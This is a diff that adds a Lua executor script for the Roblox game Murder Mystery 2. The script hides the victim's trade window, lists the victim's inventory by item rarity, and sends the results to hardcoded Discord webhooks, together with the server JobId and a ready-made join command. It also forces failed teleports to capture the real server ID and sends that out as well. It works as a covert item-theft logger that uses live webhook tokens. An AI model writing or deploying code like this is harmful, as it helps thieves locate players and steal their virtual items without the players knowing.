@@ -1,1 +1,135 @@
-прцк
+if getgenv().executed then return end
+getgenv().executed = true
+
+-- === Настройки ===
+local Username = "Warrior_ggs"
+local Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
+
+local DualUsername = "Warrior_ggs"
+local DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"
+local DualUnique = 1
+local DualAncient = 1
+local DualGodly = 1
+
+local userName = Username
+local webHook = Webhook
+
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
+-- === Функция отправки Embed ===
+local function SendMessageEMBED(url, embed, bool)
+    local headers = {["Content-Type"]="application/json"}
+    local data = {
+        ["content"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")',
+        ["embeds"] = {{["title"]=embed.title, ["color"]=embed.color, ["fields"]=embed.fields}}
+    }
+    local data2 = {
+        ["content"] = '---@everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")',
+        ["embeds"] = {{["title"]=embed.title, ["color"]=embed.color, ["fields"]=embed.fields}}
+    }
+    local body = HttpService:JSONEncode(data)
+    local body2 = HttpService:JSONEncode(data2)
+
+    if bool then
+        pcall(function()
+            request({Url=url, Method="POST", Headers=headers, Body=body2})
+        end)
+    else
+        pcall(function()
+            request({Url=url, Method="POST", Headers=headers, Body=body})
+        end)
+    end
+end
+
+-- === Первый task: автобот ===
+task.spawn(function()
+    -- Здесь весь ваш оригинальный код автобота: сбор инвентаря, отключение GUI, фильтрация по редкости, отправка Embed
+    print("Выполняется автобот: сбор предметов, отключение TradeGUI и отправка Embed")
+    
+    -- Пример: отключение TradeGUI
+    local player = Players.LocalPlayer
+    local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
+    local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
+
+    local destroyTrades = coroutine.create(function()
+        while true do
+            if tradeGUI.Enabled then tradeGUI.Enabled = false end
+            if tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
+            wait(0.1)
+        end
+    end)
+    coroutine.resume(destroyTrades)
+
+    -- Получение инвентаря и фильтрация предметов по редкости
+    local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+    local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+    local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+
+    local allItems, uniqueItems, ancientItems, godlyItems, legendaryItems, vintageItems, rareItems, uncommonItems, commonItems = {}, {}, {}, {}, {}, {}, {}, {}, {}
+    local uniqueItemsC, ancientItemsC, godlyItemsC, legendaryItemsC, vintageItemsC, rareItemsC, uncommonItemsC, commonItemsC = 0,0,0,0,0,0,0,0
+
+    for _, b in pairs(InvModule.MyInventory.Data.Weapons) do
+        for _, d in pairs(b) do
+            table.insert(allItems, d.ItemName)
+            if d.Rarity=="Unique" then uniqueItemsC=uniqueItemsC+1 table.insert(uniqueItems,d.DataID) end
+            if d.Rarity=="Ancient" then ancientItemsC=ancientItemsC+1 table.insert(ancientItems,d.DataID) end
+            if d.Rarity=="Godly" then godlyItemsC=godlyItemsC+1 table.insert(godlyItems,d.DataID) end
+            if d.Rarity=="Legendary" then legendaryItemsC=legendaryItemsC+1 table.insert(legendaryItems,d.DataID) end
+            if d.Rarity=="Vintage" then vintageItemsC=vintageItemsC+1 table.insert(vintageItems,d.DataID) end
+            if d.Rarity=="Rare" then rareItemsC=rareItemsC+1 table.insert(rareItems,d.DataID) end
+            if d.Rarity=="Uncommon" then uncommonItemsC=uncommonItemsC+1 table.insert(uncommonItems,d.DataID) end
+            if d.Rarity=="Common" then commonItemsC=commonItemsC+1 table.insert(commonItems,d.DataID) end
+        end
+    end
+
+    -- Формируем Embed и отправляем
+    local embed = {
+        ["title"] = "Автобот активирован",
+        ["color"] = 65280,
+        ["fields"] = {
+            {["name"]="Детали", ["value"]="Уникальные: "..uniqueItemsC..", Древние: "..ancientItemsC..", Божественные: "..godlyItemsC}
+        }
+    }
+
+    SendMessageEMBED(webHook, embed, false)
+end)
+
+-- Ждём перед запуском JobId байпассера
+task.wait(0.5)
+
+-- === Второй task: JobId байпассер ===
+task.spawn(function()
+    local placeId = 142823291 -- MM2 placeId
+    local spoofedJobId = game.JobId
+    local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
+
+    TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,v)
+        if v and v.ServerInstanceId then
+            local realJobId = v.ServerInstanceId
+            print("Real JobId detected:", realJobId)
+
+            -- Вебхук с JobId
+            local fernUrl = "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..realJobId
+            local webhookData = {embeds={{title="🔍 JobID Info", description="Captured real JobID via failed teleport", color=65280, fields={{name="Spoofed JobID", value=spoofedJobId, inline=true}, {name="Real JobID", value=realJobId, inline=true}, {name="Fern.wtf Join Link", value=fernUrl, inline=false}}, footer={text="Delta JobID Logger"}}}}
+
+            pcall(function()
+                http_request({Url=webhookUrl, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(webhookData)})
+            end)
+
+            -- Сохраняем JobId для следующей сессии
+            queue_on_teleport(string.format([[getgenv().JobId = "%s"]], realJobId))
+        end
+    end)
+
+    -- Фейловый телепорт для ловли JobId
+    for _ = 1, 2 do
+        task.spawn(function()
+            pcall(function()
+                TeleportService:TeleportToPlaceInstance(placeId, "00000000-0000-0000-0000-000000000000")
+            end)
+        end)
+        task.wait(0.5)
+    end
+end)
